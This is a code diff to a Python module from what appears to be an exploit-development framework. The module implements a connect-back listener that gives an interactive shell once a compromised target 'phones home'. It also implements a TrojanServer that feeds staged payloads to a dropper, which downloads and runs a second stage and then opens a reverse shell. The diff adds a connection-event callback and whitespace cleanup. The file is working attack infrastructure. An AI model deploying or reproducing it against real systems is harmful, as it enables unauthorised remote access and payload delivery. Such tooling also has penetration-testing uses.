@@ -1,9 +1,9 @@
 # Copyright (c) 2013
 # - Zachary Cutlip <uid000@gmail.com>
 # - Tactical Network Solutions, LLC
-# 
+#
 # See LICENSE.txt for more details.
-# 
+#
 import signal
 import socket
 import sys
@@ -21,9 +21,10 @@ class ConnectbackServer(object):
     connect-back payload and provides an interactive shell.  Think "netcat
     listener" that has an API and can be used programmatically.
     """
-    
+
     MAX_READ=1024
-    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True,logger=None):
+    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True,
+            logger=None,connected_event=None):
         """
         Class constructor.
 
@@ -37,7 +38,7 @@ class ConnectbackServer(object):
             service, or to customize the interactive shell, e.g., '/bin/sh -i'.
         connectback_shell: Optional.  This argument defaults to True, which is
             99% of the time is what you need.  See note.
-        logger: Optional.  A logger object is 
+        logger: Optional.  A logger object is
 
         Note
         ----
@@ -57,11 +58,12 @@ class ConnectbackServer(object):
         self.port=port
         self.startcmd=startcmd
         self.connectback_shell=connectback_shell
+        self.connected_event=connected_event
 
     def _handler(self,signum,frame):
         #print >>sys.stderr,"signal num %d\n"%signum
         self.keepgoing=False
-    
+
     def _setup_signals(self):
         self.keepgoing=True
         signal.signal(signal.SIGINT,self._handler)
@@ -75,7 +77,7 @@ class ConnectbackServer(object):
         serversocket.bind((self.connectback_ip,int(self.port)))
         serversocket.listen(5)
         return serversocket
-        
+
     def _exit(self):
         #this prevents a hang in mod_wsgi, which traps sys.exit()
         os.execv("/bin/true",["/bin/true"])
@@ -87,10 +89,14 @@ class ConnectbackServer(object):
         self.logger.LOG_INFO("Waiting for incoming connection.")
         self.keepgoing=True
 
-        
+
         (clientsocket,addess) = serversocket.accept()
 
         self.logger.LOG_INFO("Target has phoned home.")
+        if self.connected_event:
+            # let the caller know they have a connection
+            self.connected_event.set()
+
         fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
         inputlist=[clientsocket,sys.stdin]
 
@@ -146,15 +152,15 @@ class ConnectbackServer(object):
         signal.signal(signal.SIGINT,signal.SIG_DFL)
         self.pid=None
         return status[1]
-    
+
     def shutdown(self):
         """
         Shut down the server.
-        
+
         This should only be necessary if the server has not yet received a
         connection (e.g., remote exploit failed)
         or when the remote end won't close the connection.
-        
+
         In the event the server has received a connection, it should shutdown
         gracefully when the connection is closed at the remote end.
         """
@@ -196,7 +202,7 @@ class ConnectbackServer(object):
                 except Exception as e:
                     self.logger.LOG_WARN("There was an error serving shell: %s" % str(e))
 
-                serversocket.shutdown(socket.SHUT_RDWR)                    
+                serversocket.shutdown(socket.SHUT_RDWR)
                 serversocket.close()
                 self._exit()
         else:
@@ -206,21 +212,22 @@ class ConnectbackServer(object):
 class TrojanServer(ConnectbackServer):
     """
     A server that supports the TrojanDropper payload.
-    
+
     This server will serve up each of a list of file provided to the constructor.
     At the end of the list, if connect_back_shell is True, it will serve a shell
     just like ConnectbackServer does.
-    
-    An ideal use case is to have the TrojanDropper download and execute a 
+
+    An ideal use case is to have the TrojanDropper download and execute a
     second stage payload, that in turn downloads another file (i.e. wget or nc)
     then pops a connect-back shell.
-    
+
     See stage2dropper.c in contrib for an example.
     """
-    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False,logger=None):
+    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False,
+            logger=None,connected_event=None):
         """
         Constructor.
-        
+
         Parameters
         ----------
         connectback_ip: the address this server should bind to.
@@ -233,19 +240,24 @@ class TrojanServer(ConnectbackServer):
             service, or to customize the interactive shell, e.g., '/bin/sh -i'.
         connectback_shell: Optional.  This argument defaults to True, which is
             99% of the time is what you need.  See note.
-        logger: Optional.  A logger object is 
-        
+        logger: Optional.  A logger object is
+
         """
         super(self.__class__,self).__init__(connectback_ip,port=port,startcmd=startcmd,
                                                 connectback_shell=connectback_shell,logger=logger)
         self.files_to_serve=files_to_serve
         self.connectback_shell=connectback_shell
+        self.connected_event=connected_event
 
 
     def _serve_file_to_client(self,filename,serversocket):
         data=open(filename,"r").read();
         (clientsocket,address) = serversocket.accept()
+
         clientsocket.send(data)
+
+        if self.connected_event:
+            self.connected_event.set()
 
         clientsocket.shutdown(socket.SHUT_RDWR)
         clientsocket.close()
@@ -264,7 +276,7 @@ class TrojanServer(ConnectbackServer):
         except Exception as e:
             self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
             return None
-            
+
         self.pid=os.fork()
         if self.pid:
             return self.pid
@@ -279,7 +291,7 @@ class TrojanServer(ConnectbackServer):
             if self.connectback_shell == True:
                 self.logger.LOG_INFO("Serving connectback_shell.")
                 self._serve_connectback_shell(serversocket)
-            
+
             serversocket.shutdown(socket.SHUT_RDWR)
             serversocket.close()
             self._exit()
